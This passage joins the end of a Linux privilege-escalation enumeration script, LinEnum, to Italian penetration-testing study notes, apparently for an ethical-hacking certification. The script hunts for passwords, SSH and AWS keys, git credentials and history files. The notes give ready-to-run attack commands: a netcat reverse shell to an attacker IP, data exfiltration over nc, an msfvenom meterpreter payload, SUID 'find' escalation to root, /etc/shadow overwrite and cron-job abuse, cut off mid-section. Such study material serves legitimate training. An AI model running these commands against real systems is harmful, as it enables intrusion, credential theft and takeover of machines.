apacheusr=`grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null |awk '{sub(/.*\export /,"")}1' 2>/dev/null`
if [ "$apacheusr" ]; then
  echo -e "\e[00;31m[-] Apache user configuration:\e[00m\n$apacheusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$apacheusr" ]; then
  mkdir --parents $format/etc-export/apache2/ 2>/dev/null
  cp /etc/apache2/envvars $format/etc-export/apache2/envvars 2>/dev/null
fi

#installed apache modules
apachemodules=`apache2ctl -M 2>/dev/null; httpd -M 2>/dev/null`
if [ "$apachemodules" ]; then
  echo -e "\e[00;31m[-] Installed Apache modules:\e[00m\n$apachemodules" 
  echo -e "\n"
fi

#htpasswd check
htpasswd=`find / -name .htpasswd -print -exec cat {} \; 2>/dev/null`
if [ "$htpasswd" ]; then
    echo -e "\e[00;33m[-] htpasswd found - could contain passwords:\e[00m\n$htpasswd"
    echo -e "\n"
fi

#anything in the default http home dirs (a thorough only check as output can be large)
if [ "$thorough" = "1" ]; then
  apachehomedirs=`ls -alhR /var/www/ 2>/dev/null; ls -alhR /srv/www/htdocs/ 2>/dev/null; ls -alhR /usr/local/www/apache2/data/ 2>/dev/null; ls -alhR /opt/lampp/htdocs/ 2>/dev/null`
  if [ "$apachehomedirs" ]; then
    echo -e "\e[00;31m[-] www home dir contents:\e[00m\n$apachehomedirs" 
    echo -e "\n"
  fi
fi

}

interesting_files()
{
echo -e "\e[00;33m### INTERESTING FILES ####################################\e[00m" 

#checks to see if various files are installed
echo -e "\e[00;31m[-] Useful file locations:\e[00m" ; which nc 2>/dev/null ; which netcat 2>/dev/null ; which wget 2>/dev/null ; which nmap 2>/dev/null ; which gcc 2>/dev/null; which curl 2>/dev/null 
echo -e "\n" 

#limited search for installed compilers
compiler=`dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null`
if [ "$compiler" ]; then
  echo -e "\e[00;31m[-] Installed compilers:\e[00m\n$compiler" 
  echo -e "\n"
fi

#manual check - lists out sensitive files, can we read/modify etc.
echo -e "\e[00;31m[-] Can we read/write sensitive files:\e[00m" ; ls -la /etc/passwd 2>/dev/null ; ls -la /etc/group 2>/dev/null ; ls -la /etc/profile 2>/dev/null; ls -la /etc/shadow 2>/dev/null ; ls -la /etc/master.passwd 2>/dev/null 
echo -e "\n" 

#search for suid files
allsuid=`find / -perm -4000 -type f 2>/dev/null`
findsuid=`find $allsuid -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsuid" ]; then
  echo -e "\e[00;31m[-] SUID files:\e[00m\n$findsuid" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$findsuid" ]; then
  mkdir $format/suid-files/ 2>/dev/null
  for i in $findsuid; do cp $i $format/suid-files/; done 2>/dev/null
fi

#list of 'interesting' suid files - feel free to make additions
intsuid=`find $allsuid -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsuid" ]; then
  echo -e "\e[00;33m[+] Possibly interesting SUID files:\e[00m\n$intsuid" 
  echo -e "\n"
fi

#lists world-writable suid files
wwsuid=`find $allsuid -perm -4002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsuid" ]; then
  echo -e "\e[00;33m[+] World-writable SUID files:\e[00m\n$wwsuid" 
  echo -e "\n"
fi

#lists world-writable suid files owned by root
wwsuidrt=`find $allsuid -uid 0 -perm -4002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsuidrt" ]; then
  echo -e "\e[00;33m[+] World-writable SUID files owned by root:\e[00m\n$wwsuidrt" 
  echo -e "\n"
fi

#search for sgid files
allsgid=`find / -perm -2000 -type f 2>/dev/null`
findsgid=`find $allsgid -perm -2000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsgid" ]; then
  echo -e "\e[00;31m[-] SGID files:\e[00m\n$findsgid" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$findsgid" ]; then
  mkdir $format/sgid-files/ 2>/dev/null
  for i in $findsgid; do cp $i $format/sgid-files/; done 2>/dev/null
fi

#list of 'interesting' sgid files
intsgid=`find $allsgid -perm -2000 -type f  -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsgid" ]; then
  echo -e "\e[00;33m[+] Possibly interesting SGID files:\e[00m\n$intsgid" 
  echo -e "\n"
fi

#lists world-writable sgid files
wwsgid=`find $allsgid -perm -2002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsgid" ]; then
  echo -e "\e[00;33m[+] World-writable SGID files:\e[00m\n$wwsgid" 
  echo -e "\n"
fi

#lists world-writable sgid files owned by root
wwsgidrt=`find $allsgid -uid 0 -perm -2002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsgidrt" ]; then
  echo -e "\e[00;33m[+] World-writable SGID files owned by root:\e[00m\n$wwsgidrt" 
  echo -e "\n"
fi

#list all files with POSIX capabilities set along with there capabilities
fileswithcaps=`getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null`
if [ "$fileswithcaps" ]; then
  echo -e "\e[00;31m[+] Files with POSIX capabilities set:\e[00m\n$fileswithcaps"
  echo -e "\n"
fi

if [ "$export" ] && [ "$fileswithcaps" ]; then
  mkdir $format/files_with_capabilities/ 2>/dev/null
  for i in $fileswithcaps; do cp $i $format/files_with_capabilities/; done 2>/dev/null
fi

#searches /etc/security/capability.conf for users associated capapilies
userswithcaps=`grep -v '^#\|none\|^$' /etc/security/capability.conf 2>/dev/null`
if [ "$userswithcaps" ]; then
  echo -e "\e[00;33m[+] Users with specific POSIX capabilities:\e[00m\n$userswithcaps"
  echo -e "\n"
fi

if [ "$userswithcaps" ] ; then
#matches the capabilities found associated with users with the current user
matchedcaps=`echo -e "$userswithcaps" | grep \`whoami\` | awk '{print $1}' 2>/dev/null`
	if [ "$matchedcaps" ]; then
		echo -e "\e[00;33m[+] Capabilities associated with the current user:\e[00m\n$matchedcaps"
		echo -e "\n"
		#matches the files with capapbilities with capabilities associated with the current user
		matchedfiles=`echo -e "$matchedcaps" | while read -r cap ; do echo -e "$fileswithcaps" | grep "$cap" ; done 2>/dev/null`
		if [ "$matchedfiles" ]; then
			echo -e "\e[00;33m[+] Files with the same capabilities associated with the current user (You may want to try abusing those capabilties):\e[00m\n$matchedfiles"
			echo -e "\n"
			#lists the permissions of the files having the same capabilies associated with the current user
			matchedfilesperms=`echo -e "$matchedfiles" | awk '{print $1}' | while read -r f; do ls -la $f ;done 2>/dev/null`
			echo -e "\e[00;33m[+] Permissions of files with the same capabilities associated with the current user:\e[00m\n$matchedfilesperms"
			echo -e "\n"
			if [ "$matchedfilesperms" ]; then
				#checks if any of the files with same capabilities associated with the current user is writable
				writablematchedfiles=`echo -e "$matchedfiles" | awk '{print $1}' | while read -r f; do find $f -writable -exec ls -la {} + ;done 2>/dev/null`
				if [ "$writablematchedfiles" ]; then
					echo -e "\e[00;33m[+] User/Group writable files with the same capabilities associated with the current user:\e[00m\n$writablematchedfiles"
					echo -e "\n"
				fi
			fi
		fi
	fi
fi

#look for private keys - thanks djhohnstein
if [ "$thorough" = "1" ]; then
privatekeyfiles=`grep -rl "PRIVATE KEY-----" /home 2>/dev/null`
	if [ "$privatekeyfiles" ]; then
  		echo -e "\e[00;33m[+] Private SSH keys found!:\e[00m\n$privatekeyfiles"
  		echo -e "\n"
	fi
fi

#look for AWS keys - thanks djhohnstein
if [ "$thorough" = "1" ]; then
awskeyfiles=`grep -rli "aws_secret_access_key" /home 2>/dev/null`
	if [ "$awskeyfiles" ]; then
  		echo -e "\e[00;33m[+] AWS secret keys found!:\e[00m\n$awskeyfiles"
  		echo -e "\n"
	fi
fi

#look for git credential files - thanks djhohnstein
if [ "$thorough" = "1" ]; then
gitcredfiles=`find / -name ".git-credentials" 2>/dev/null`
	if [ "$gitcredfiles" ]; then
  		echo -e "\e[00;33m[+] Git credentials saved on the machine!:\e[00m\n$gitcredfiles"
  		echo -e "\n"
	fi
fi

#list all world-writable files excluding /proc and /sys
if [ "$thorough" = "1" ]; then
wwfiles=`find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -la {} 2>/dev/null \;`
	if [ "$wwfiles" ]; then
		echo -e "\e[00;31m[-] World-writable files (excluding /proc and /sys):\e[00m\n$wwfiles" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wwfiles" ]; then
		mkdir $format/ww-files/ 2>/dev/null
		for i in $wwfiles; do cp --parents $i $format/ww-files/; done 2>/dev/null
	fi
fi

#are any .plan files accessible in /home (could contain useful information)
usrplan=`find /home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$usrplan" ]; then
  echo -e "\e[00;31m[-] Plan file permissions and contents:\e[00m\n$usrplan" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$usrplan" ]; then
  mkdir $format/plan_files/ 2>/dev/null
  for i in $usrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
fi

bsdusrplan=`find /usr/home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$bsdusrplan" ]; then
  echo -e "\e[00;31m[-] Plan file permissions and contents:\e[00m\n$bsdusrplan" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$bsdusrplan" ]; then
  mkdir $format/plan_files/ 2>/dev/null
  for i in $bsdusrplan; do cp --parents $i $format/plan_files/; done 2>/dev/null
fi

#are there any .rhosts files accessible - these may allow us to login as another user etc.
rhostsusr=`find /home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostsusr" ]; then
  echo -e "\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n$rhostsusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$rhostsusr" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

bsdrhostsusr=`find /usr/home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$bsdrhostsusr" ]; then
  echo -e "\e[00;33m[+] rhost config file(s) and file contents:\e[00m\n$bsdrhostsusr" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$bsdrhostsusr" ]; then
  mkdir $format/rhosts 2>/dev/null
  for i in $bsdrhostsusr; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

rhostssys=`find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;`
if [ "$rhostssys" ]; then
  echo -e "\e[00;33m[+] Hosts.equiv file and contents: \e[00m\n$rhostssys" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$rhostssys" ]; then
  mkdir $format/rhosts/ 2>/dev/null
  for i in $rhostssys; do cp --parents $i $format/rhosts/; done 2>/dev/null
fi

#list nfs shares/permisisons etc.
nfsexports=`ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null`
if [ "$nfsexports" ]; then
  echo -e "\e[00;31m[-] NFS config details: \e[00m\n$nfsexports" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$nfsexports" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/exports $format/etc-export/exports 2>/dev/null
fi

if [ "$thorough" = "1" ]; then
  #phackt
  #displaying /etc/fstab
  fstab=`cat /etc/fstab 2>/dev/null`
  if [ "$fstab" ]; then
    echo -e "\e[00;31m[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems\e[00m"
    echo -e "$fstab"
    echo -e "\n"
  fi
fi

#looking for credentials in /etc/fstab
fstab=`grep username /etc/fstab 2>/dev/null |awk '{sub(/.*\username=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo username: 2>/dev/null; grep password /etc/fstab 2>/dev/null |awk '{sub(/.*\password=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo password: 2>/dev/null; grep domain /etc/fstab 2>/dev/null |awk '{sub(/.*\domain=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo domain: 2>/dev/null`
if [ "$fstab" ]; then
  echo -e "\e[00;33m[+] Looks like there are credentials in /etc/fstab!\e[00m\n$fstab"
  echo -e "\n"
fi

if [ "$export" ] && [ "$fstab" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
fi

fstabcred=`grep cred /etc/fstab 2>/dev/null |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null`
if [ "$fstabcred" ]; then
    echo -e "\e[00;33m[+] /etc/fstab contains a credentials file!\e[00m\n$fstabcred" 
    echo -e "\n"
fi

if [ "$export" ] && [ "$fstabcred" ]; then
  mkdir $format/etc-exports/ 2>/dev/null
  cp /etc/fstab $format/etc-exports/fstab done 2>/dev/null
fi

#use supplied keyword and cat *.conf files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ]; then
  echo -e "[-] Can't search *.conf files as no keyword was entered\n" 
  else
    confkey=`find / -maxdepth 4 -name *.conf -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$confkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .conf files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$confkey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .conf files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .conf files" 
	echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ]; then
  :
  else
    if [ "$export" ] && [ "$confkey" ]; then
	  confkeyfile=`find / -maxdepth 4 -name *.conf -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/config_files/ 2>/dev/null
      for i in $confkeyfile; do cp --parents $i $format/keyword_file_matches/config_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.php files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ]; then
  echo -e "[-] Can't search *.php files as no keyword was entered\n" 
  else
    phpkey=`find / -maxdepth 10 -name *.php -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$phpkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .php files (recursive 10 levels - output format filepath:identified line number where keyword appears):\e[00m\n$phpkey" 
      echo -e "\n" 
     else 
  echo -e "\e[00;31m[-] Find keyword ($keyword) in .php files (recursive 10 levels):\e[00m" 
  echo -e "'$keyword' not found in any .php files" 
  echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ]; then
  :
  else
    if [ "$export" ] && [ "$phpkey" ]; then
    phpkeyfile=`find / -maxdepth 10 -name *.php -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/php_files/ 2>/dev/null
      for i in $phpkeyfile; do cp --parents $i $format/keyword_file_matches/php_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.log files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "[-] Can't search *.log files as no keyword was entered\n" 
  else
    logkey=`find / -maxdepth 4 -name *.log -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$logkey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .log files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$logkey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .log files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .log files"
	echo -e "\n" 
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$logkey" ]; then
      logkeyfile=`find / -maxdepth 4 -name *.log -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
	  mkdir --parents $format/keyword_file_matches/log_files/ 2>/dev/null
      for i in $logkeyfile; do cp --parents $i $format/keyword_file_matches/log_files/ ; done 2>/dev/null
  fi
fi

#use supplied keyword and cat *.ini files for potential matches - output will show line number within relevant file path where a match has been located
if [ "$keyword" = "" ];then
  echo -e "[-] Can't search *.ini files as no keyword was entered\n" 
  else
    inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -Hn $keyword {} \; 2>/dev/null`
    if [ "$inikey" ]; then
      echo -e "\e[00;31m[-] Find keyword ($keyword) in .ini files (recursive 4 levels - output format filepath:identified line number where keyword appears):\e[00m\n$inikey" 
      echo -e "\n" 
     else 
	echo -e "\e[00;31m[-] Find keyword ($keyword) in .ini files (recursive 4 levels):\e[00m" 
	echo -e "'$keyword' not found in any .ini files" 
	echo -e "\n"
    fi
fi

if [ "$keyword" = "" ];then
  :
  else
    if [ "$export" ] && [ "$inikey" ]; then
	  inikey=`find / -maxdepth 4 -name *.ini -type f -exec grep -lHn $keyword {} \; 2>/dev/null`
      mkdir --parents $format/keyword_file_matches/ini_files/ 2>/dev/null
      for i in $inikey; do cp --parents $i $format/keyword_file_matches/ini_files/ ; done 2>/dev/null
  fi
fi

#quick extract of .conf files from /etc - only 1 level
allconf=`find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null`
if [ "$allconf" ]; then
  echo -e "\e[00;31m[-] All *.conf files in /etc (recursive 1 level):\e[00m\n$allconf" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$allconf" ]; then
  mkdir $format/conf-files/ 2>/dev/null
  for i in $allconf; do cp --parents $i $format/conf-files/; done 2>/dev/null
fi

#extract any user history files that are accessible
usrhist=`ls -la ~/.*_history 2>/dev/null`
if [ "$usrhist" ]; then
  echo -e "\e[00;31m[-] Current user's history files:\e[00m\n$usrhist" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$usrhist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  for i in $usrhist; do cp --parents $i $format/history_files/; done 2>/dev/null
fi

#can we read roots *_history files - could be passwords stored etc.
roothist=`ls -la /root/.*_history 2>/dev/null`
if [ "$roothist" ]; then
  echo -e "\e[00;33m[+] Root's history files are accessible!\e[00m\n$roothist" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$roothist" ]; then
  mkdir $format/history_files/ 2>/dev/null
  cp $roothist $format/history_files/ 2>/dev/null
fi

#all accessible .bash_history files in /home
checkbashhist=`find /home -name .bash_history -print -exec cat {} 2>/dev/null \;`
if [ "$checkbashhist" ]; then
  echo -e "\e[00;31m[-] Location and contents (if accessible) of .bash_history file(s):\e[00m\n$checkbashhist"
  echo -e "\n"
fi

#any .bak files that may be of interest
bakfiles=`find / -name *.bak -type f 2</dev/null`
if [ "$bakfiles" ]; then
  echo -e "\e[00;31m[-] Location and Permissions (if accessible) of .bak file(s):\e[00m"
  for bak in `echo $bakfiles`; do ls -la $bak;done
  echo -e "\n"
fi

#is there any mail accessible
readmail=`ls -la /var/mail 2>/dev/null`
if [ "$readmail" ]; then
  echo -e "\e[00;31m[-] Any interesting mail in /var/mail:\e[00m\n$readmail" 
  echo -e "\n"
fi

#can we read roots mail
readmailroot=`head /var/mail/root 2>/dev/null`
if [ "$readmailroot" ]; then
  echo -e "\e[00;33m[+] We can read /var/mail/root! (snippet below)\e[00m\n$readmailroot" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readmailroot" ]; then
  mkdir $format/mail-from-root/ 2>/dev/null
  cp $readmailroot $format/mail-from-root/ 2>/dev/null
fi
}

docker_checks()
{

#specific checks - check to see if we're in a docker container
dockercontainer=` grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`
if [ "$dockercontainer" ]; then
  echo -e "\e[00;33m[+] Looks like we're in a Docker container:\e[00m\n$dockercontainer" 
  echo -e "\n"
fi

#specific checks - check to see if we're a docker host
dockerhost=`docker --version 2>/dev/null; docker ps -a 2>/dev/null`
if [ "$dockerhost" ]; then
  echo -e "\e[00;33m[+] Looks like we're hosting Docker:\e[00m\n$dockerhost" 
  echo -e "\n"
fi

#specific checks - are we a member of the docker group
dockergrp=`id | grep -i docker 2>/dev/null`
if [ "$dockergrp" ]; then
  echo -e "\e[00;33m[+] We're a member of the (docker) group - could possibly misuse these rights!\e[00m\n$dockergrp" 
  echo -e "\n"
fi

#specific checks - are there any docker files present
dockerfiles=`find / -name Dockerfile -exec ls -l {} 2>/dev/null \;`
if [ "$dockerfiles" ]; then
  echo -e "\e[00;31m[-] Anything juicy in the Dockerfile:\e[00m\n$dockerfiles" 
  echo -e "\n"
fi

#specific checks - are there any docker files present
dockeryml=`find / -name docker-compose.yml -exec ls -l {} 2>/dev/null \;`
if [ "$dockeryml" ]; then
  echo -e "\e[00;31m[-] Anything juicy in docker-compose.yml:\e[00m\n$dockeryml" 
  echo -e "\n"
fi
}

lxc_container_checks()
{

#specific checks - are we in an lxd/lxc container
lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`
if [ "$lxccontainer" ]; then
  echo -e "\e[00;33m[+] Looks like we're in a lxc container:\e[00m\n$lxccontainer"
  echo -e "\n"
fi

#specific checks - are we a member of the lxd group
lxdgroup=`id | grep -i lxd 2>/dev/null`
if [ "$lxdgroup" ]; then
  echo -e "\e[00;33m[+] We're a member of the (lxd) group - could possibly misuse these rights!\e[00m\n$lxdgroup"
  echo -e "\n"
fi
}

footer()
{
echo -e "\e[00;33m### SCAN COMPLETE ####################################\e[00m" 
}

call_each()
{
  header
  debug_info
  system_info
  user_info
  environmental_info
  job_info
  networking_info
  services_info
  software_configs
  interesting_files
  docker_checks
  lxc_container_checks
  footer
}

while getopts "h:k:r:e:st" option; do
 case "${option}" in
    k) keyword=${OPTARG};;
    r) report=${OPTARG}"-"`date +"%d-%m-%y"`;;
    e) export=${OPTARG};;
    s) sudopass=1;;
    t) thorough=1;;
    h) usage; exit;;
    *) usage; exit;;
 esac
done

call_each | tee -a $report 2> /dev/null
#EndOfScript
```

</details>

{% code title="msf" %}
```shellscript
cd /tmp
upload /root/Desktop/LinEnum.sh
shell
    /bin/bash -i
    id
    whoami
    cat /etc/passwd
    ls                                    #Check che ci sia il LinEnum.sh
    chmod +x LinuEnum.sh 
    ./LinEnum.sh -r LinEnum.txt
    #Aspetta 2/3 minuti e avrai un output
```
{% endcode %}

Prenditi il file

{% tabs %}
{% tab title="Se hai SSH" %}
```shellscript
scp <USER>@<IP>:/tmp/LinEnum.txt ~/Desktop/
```
{% endtab %}

{% tab title="RevShell HTTP" %}
VICTIM

```shellscript
cd /tmp
python3 -m http.server <PORT>
```

KALI

```shellscript
wget http://<IP>:<PORT>/LinEnum.txt
```
{% endtab %}

{% tab title="Untitled" %}
VICTIM

```shellscript
nc <IP_ATTACKER> <PORT> < /tmp/LinEnum.txt
```

KALI

```shellscript
nc -lvnp <PORT> > LinEnum.txt
```
{% endtab %}
{% endtabs %}

Fatto. Leggi il file di output.

Fra le cose utili users.

***

***

## <mark style="color:$primary;">2 - Transferring file</mark>

Se con l'exploit hai già high privilege non serve farlo come:

1. Setta un web server con Python
2. Trasferisci file su Linux

***

### <mark style="color:$primary;">Kali -> Victim (L)</mark>

Non serve per forza meterpreter

{% tabs %}
{% tab title="kali -> victim (simpleHTTPServer)" %}
CHI INVIA - KALI

```shellscript
cd /usr/share/webshells/php/                       #/PATH/DEL/FILE.exe

python -m SimpleHTTPServer 80                        #PORT: 80,8080,1234... Python2
#OPPURE se hai python v3
python3 -m http.server 80                            #PORT: 80,8080,1234... Python3
```

CHI PRENDE IL FILE - VICTIM (Windows)

```shellscript
cd /
ls

#Se non esiste crea Temp
mkdir /tmp/
cd /tmp/

wget http://<IP_KALI>/php-backdoor.php                #shell. NO METERPRETER
```

Torna su KALI

{% code title="Tramite BROWSER" %}
```http
http://<IP_KALI>/php-backdoor.php
```
{% endcode %}

oppure

```shell
curl http://localhost/php-backdoor.php
```
{% endtab %}
{% endtabs %}

***

***

## <mark style="color:$primary;">3 - Upgrade shell</mark>

Se con l'exploit hai già high privilege non serve farlo: se hai ottenuto una non-interactive shell o uno standard cmd shell hai bisogno di fare l'upgrade ad una meterpreter shell o ad una bash per poter fare altri task che vuoi.&#x20;

{% tabs %}
{% tab title="Metasploit upgrade" %}
{% code title="msf - Kali" %}
```shellscript
sessions -u <NUMBER>                        
```
{% endcode %}
{% endtab %}
{% endtabs %}

OPPURE

{% tabs %}
{% tab title="python" %}
```shell
cat /etc/shells
/bin/bash -i 
#SE NON FUNZIONA USA SOTTO
python -c 'import pty; pty.spawn("/bin/bash")'
```
{% endtab %}
{% endtabs %}

***

### <mark style="color:$primary;">Reverse Shell</mark>

Con netcat hai una comunicazione client-server su connessione TCP o UDP (Windows e Linux).

{% hint style="info" %}
Puoi usarlo per:

* Banner grabbing
* Port scanning
* Trasferire file&#x20;
* Bind/Reverse Shell
{% endhint %}

Shell remota dove la vittima si connette al listener dell'attacker oermettendogli di eseguire comandi sulla vittima.

{% hint style="warning" %}
**VICTIM** (netcat client)   ->   **ATTACKER** (netcat listener)&#x20;
{% endhint %}

{% tabs %}
{% tab title="Linux Victim" %}
ATTACKER (netcat listener - kali)

```shell
nc -nvlp <PORT>                                             #Setta il listener sull'attacker
```

VICTIM (netcat client - linux)

```shell
nc -nv <IP_ATTACKER> <STESSA_PORTA_DEL_LISTENER> -e /bin/bash
```

ATTACKER (kali)

```shell
#Ora dall'attacker sarà partita una shell che potrai usare
whoami
ls -al
cd /var/www/
```
{% endtab %}
{% endtabs %}

***

## <mark style="color:$primary;">4 - PrivEsc</mark>

### <mark style="color:$primary;">Da SSH session a meterpreter</mark>&#x20;

{% code title="KALI" %}
```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP_KALI> LPORT=4444 -f elf -o shell.elf

scp shell.elf <USER>@<IP>:/tmp/shell.elf
```
{% endcode %}

Accedi a SSH

{% code title="SSH session" %}
```shell
chmod +x /tmp/shell.elf
/tmp/shell.elf
```
{% endcode %}

{% code title="msf - KALI" %}
```shell
use exploit/multi/handler
    set payload linux/x64/meterpreter/reverse_tcp
    set LHOST <IP_KALI>
    set LPORT 4444
    run
    
background
```
{% endcode %}

Ora a partire da SSH hai una sessione meterpreter da poter usare per privesc msf modules.

***

### <mark style="color:$primary;">SUID permissions</mark>&#x20;

Una volta dentro la vittima e hai una shell

```shell
find / -perm -4000 -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;
```

Cerca SUID interessanti (e.g. /usr/bin/find)

<mark style="color:$danger;">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</mark>\ <mark style="color:$danger;">/usr/bin/chfn</mark>\ <mark style="color:$danger;">/usr/bin/passwd</mark>\
/usr/bin/find\ <mark style="color:$danger;">/usr/bin/mount</mark>\ <mark style="color:$danger;">/usr/bin/chsh</mark>\ <mark style="color:$danger;">/usr/bin/gpasswd</mark>\ <mark style="color:$danger;">/usr/bin/newgrp</mark>\ <mark style="color:$danger;">/usr/bin/su</mark>\ <mark style="color:$danger;">/usr/bin/umount</mark>

Esegui per diventare root

```shell
/usr/bin/find . -exec /bin/sh -p ;
```

Ora dovresti essere root.

{% embed url="https://prinugupta.medium.com/host-network-penetration-testing-exploitation-ctf-3-ejpt-ine-bc555b687df3" %}

***

### <mark style="color:$primary;">Weak permissions</mark>

Usa un file/dir configurata male per privesc

{% code title="shell in victim (\bin\bash o meterpreter)" %}
```sh
find / -not -type l -perm -o+w                                  #Cerca tutti i file e le directory scrivibili da chiunque 
#Cerca file interessanti:
#    /etc/shadow
```
{% endcode %}

Se per fortuna hai accesso a /etc/shadow&#x20;

```shellscript
openssl passwd -1 -salt abc password                            #Genera l'hash della psw che è password
vim /etc/shadow
#Sostituisci root:<OUTPUT_DI_OPENSSL>:lasciaComePrima 

su                                                              #Metti la psw password
whoami                                                          #Check che sei root
```

***

### <mark style="color:$primary;">Misconfigured Cron Jobs</mark>

{% hint style="warning" %}
Attacca cron jobs che sono creati o schedulati da root user poichè vengono eseguiti con root privileges.

1 - Identifica un file o uno script che viene usato da un cron job

2 - Trova se quello script può essere modificato da un utente senza privilegi

3 - Modifica lo script in modo da aggiungere l'utente corrente al file sudoers (dunque di eseguire come root)
{% endhint %}

{% hint style="info" %}
Per capire quando viene eseguito un cronjob guarda gli \*

\* \* \* \* \* CMD\_DA\_ESEGUIRE

min ore giorniDelMese mese giorniDellaSett
{% endhint %}

Potrebbe essere utile:

* Connettiti ad un netcat listener
* Rendi l'user a cui hai accesso to sudoers file per permettergli di fare cmd con root privileges

Cron Jobs: Servizio che esegue app, script e altri comandi ripetitivamente nel tempo secondo uno scheduling.

```shellscript
whoami                                                    #User con privilegi bassi
groups <USER_TROVATO>
cat /etc/passwd                                           #Root hai root:/root:/bin/bash
                                                          #User reali hai /bin/sh o /bin/bash
crontab -l                                                
#Forse dirà che non ci sono crontab per USER_TROVATO
cat /etc/crontab
```

{% tabs %}
{% tab title="Esempio del corso" %}
Se vuoto spera che ci siano pochi file nella home dell'user trovato e studia quello.

{% hint style="info" %}
CERCA FILE in /home/\<user>

Di solito pochissimi o solo uno.
{% endhint %}

```shellscript
ls -al
cat <FILE_TROVATO>                                         #Forse non permesso
#Prova a vedere se lo puoi trovare e modificare in altri modi
pwd                                                        #Leggi il path del file
cd /
grep -rnw /usr -e "/<PATH_TO_FILE>/<file>"                 #Cerca dove appare il path
#Cerca lo script che dovrebbe essere apparso
#VERIFICA CHE RIESCI A SCRIVERCI
```

Trova uno script di root che venga eseguito da root ma che puoi modificare anche tu stesso

```shellscript
#Aggiungi l'user che hai ai sudoers per poter eseguire comandi root senza dare la psw
